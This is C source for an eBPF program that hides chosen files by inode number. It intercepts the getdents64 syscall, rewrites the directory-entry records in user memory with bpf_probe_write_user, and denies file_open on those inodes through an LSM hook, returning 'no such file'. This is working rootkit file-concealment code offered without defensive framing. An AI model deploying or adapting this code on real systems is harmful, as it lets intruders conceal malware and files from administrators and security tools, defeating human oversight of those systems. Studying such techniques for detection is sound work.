#include "common.h"
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <string.h>

#define ENOENT 2

static void hide_first_entry(long unsigned int buff_addr,
    struct linux_dirent64 * dirp,
    unsigned short d_reclen);

char _license[] SEC("license") = "GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

/**
 * Servers as buffer for linux_dirent64 between
 * sys_enter_getdents64 and sys_exit_getdents64
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, u64);
} map_buffs SEC(".maps");

/**
 * Saves amount of bytes that were already read
 * by sys_exit_getdents64 before
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

/**
 * Saves linux_dirent64 that needs to be hidden. It is retrieved in
 * handle_getdents_patch function
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

/**
 * Array that holds indexes and functions that belongs to given index.
 * Used for bpf_tail_call execution.
 */
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 8); // Max entries for tail‑call targets
    __type(key, __u32);
    __type(value, __u32); // Program FD
} prog_array SEC(".maps");

const volatile uint64_t inodes_to_hide[INODES_TO_HIDE_LEN] = {0};
const volatile size_t inodes_to_hide_len = 0;

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter * ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();

    unsigned int fd = ctx->args[0];
    struct linux_dirent64 * dirp = (struct linux_dirent64 *)ctx->args[1];

    // Store dirp for exit function
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit * ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    // Get the number of bytes read from syscall return value
    long total_bytes_read = ctx->ret;
    if (total_bytes_read <= 0)
        return 0;

    // Retrieve buffer pointer stored during entry
    long unsigned int * pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (!pbuff_addr)
        return 0;

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 * dirp;
    unsigned short d_reclen;
    unsigned int bpos = 0;

    // Try to get bpos from previous run, if fail bpos stays zero
    unsigned int * loaded_bpos = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (loaded_bpos != 0) {
        bpos = *loaded_bpos;
    }

    // Iterate through directory entries,
    // loop limit prevents verifier issues
    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read)
            break;

        // Point to current entry
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);

        // Read the record length field safely
        u64 inode = 0;
        bpf_probe_read_user(&inode, sizeof(inode), &dirp->d_ino);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

        if (d_reclen == 0)
            break;

        // Check if we found target inode
        for (size_t i = 0; i < INODES_TO_HIDE_LEN; i++) {
            // Don't waste cycles if inode wasn't set
            if (i == inodes_to_hide_len)
                break;

            if (inodes_to_hide[i] == inode) {
                if (bpos == 0) { // First entry
                    if (total_bytes_read == d_reclen) { // only one entry
                        break;
                    }
                    hide_first_entry(buff_addr, dirp, d_reclen);
                    break;
                }

                // Go to the handle_getdents_patch function
                // bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
                // bpf_map_delete_elem(&map_buffs, &pid_tgid);
                bpos += d_reclen;
                bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
                bpf_tail_call(ctx, &prog_array, PROG_02);
                break;
            }
        }

        // Move to next entry
        bpf_printk("moving to next entry, current inode: %d\n", inode);
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If there is more to read, call this function again
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

static void hide_first_entry(long unsigned int buff_addr, struct linux_dirent64 * dirp, unsigned short d_reclen) {
    // To hide the first entry, we have to move second entry to
    // its place, and set its size (d_reclen) to the sum of
    // first entry (the one we hidding) and its next entry

    // Reason why we manually copy each field from dirp_next to
    // drip, is becuase ebpf won't allow to copy dirp directly

    // Copy second buffer to first one
    struct linux_dirent64 * dirp_next = (struct linux_dirent64 *)(buff_addr + d_reclen);

    // Copy dirp_next to the current dirp field by field
    u64 tmp_inode, tmp_d_off;
    unsigned short tmp_reclean, next_reclean;
    unsigned short tmp_type;
    // Read all fields (except d_name)
    bpf_probe_read_user(&tmp_inode, sizeof(tmp_inode), &dirp_next->d_ino);
    bpf_probe_read_user(&tmp_d_off, sizeof(tmp_d_off), &dirp_next->d_off);
    bpf_probe_read_user(&tmp_reclean, sizeof(tmp_reclean), &dirp_next->d_reclen);
    bpf_probe_read_user(&tmp_type, sizeof(tmp_type), &dirp_next->d_type);

    // Copy next dirent reclean for later use
    next_reclean = tmp_reclean;
    // Increase size of reclean to sum of first and second dirents
    // This is part of hiding mechanism
    tmp_reclean += d_reclen;

    // Rewrite all fields (except d_name)
    bpf_probe_write_user(&dirp->d_ino, &tmp_inode, sizeof(tmp_inode));
    bpf_probe_write_user(&dirp->d_off, &tmp_d_off, sizeof(tmp_d_off));
    bpf_probe_write_user(&dirp->d_reclen, &tmp_reclean, sizeof(tmp_reclean));
    bpf_probe_write_user(&dirp->d_type, &tmp_type, sizeof(tmp_type));

    // Actual d_name size of dirp_next
    size_t name_size =  next_reclean - 2 - offsetof(struct linux_dirent, d_name);

    // Read d_name
    char tmp_filename[MAX_FILENAME_LEN];
    bpf_probe_read_user(&tmp_filename, sizeof(tmp_filename), &dirp_next->d_name);

    // Rewrite d_name
    // Copy filename byte by byte, because ebpf won't allow to copy it once
    for (size_t j = 0; j < 32; j++) {
        if (j == name_size + 1)
            break;
        bpf_probe_write_user(&dirp->d_name[j], &tmp_filename[j], sizeof(char));
    }
}

SEC("tp/unused")
int handle_getdents_patch(struct trace_event_raw_sys_exit * ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int * prev_buff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (prev_buff_addr == 0) {
        return 0;
    }

    // Hiding works by getting d_reclen from previous directory, and add
    // d_reclen of current directory so it is skipped in reading.

    // Get data from previous directory
    long unsigned int buff_addr = *prev_buff_addr;
    struct linux_dirent64 * dirp_prev = (struct linux_dirent64 *)buff_addr;
    short unsigned int reclen_prev = 0;
    bpf_probe_read_user(&reclen_prev, sizeof(reclen_prev), &dirp_prev->d_reclen);

    // Get data for current (target directory)
    struct linux_dirent64 * dirp = (struct linux_dirent64 *)(buff_addr + reclen_prev);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Send message to user space before overwrite
    // Allocate a buffer for the ring buffer
    struct event * data = bpf_ringbuf_reserve(&rb, sizeof(struct event), 0);
    if (!data) {
        return 0;
    }

    // Geet data for message
    u64 inode = 0;
    char filename[MAX_FILENAME_LEN];
    bpf_probe_read_user(&inode, sizeof(inode), &dirp->d_ino);
    bpf_probe_read_user_str(&filename, sizeof(filename), &dirp->d_name);

    // Copy the value to the ring buffer
    data->inode = inode;
    memcpy(data->filename, filename, sizeof(filename));

    // Submit the data to the ring buffer
    bpf_ringbuf_submit(data, 0);

    // Overwrite d_reclen
    short unsigned int reclen_new = reclen_prev + d_reclen;
    long ret = bpf_probe_write_user(&dirp_prev->d_reclen, &reclen_new, sizeof(reclen_new));

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);

    // Go back to the original call, to check if there is more to hide
    bpf_tail_call(ctx, &prog_array, PROG_01);
    return 0;
}

SEC("lsm/file_open")
int BPF_PROG(trace_file_open, struct file * file) {
    u64 inode = file->f_inode->i_ino;

    for (size_t i = 0; i < INODES_TO_HIDE_LEN; i++) {
        // Don't waste cycles if inode wasn't set
        if (i == inodes_to_hide_len)
            break;

        if (inodes_to_hide[i] == inode)
            return -ENOENT;
    }

    return 0;
}
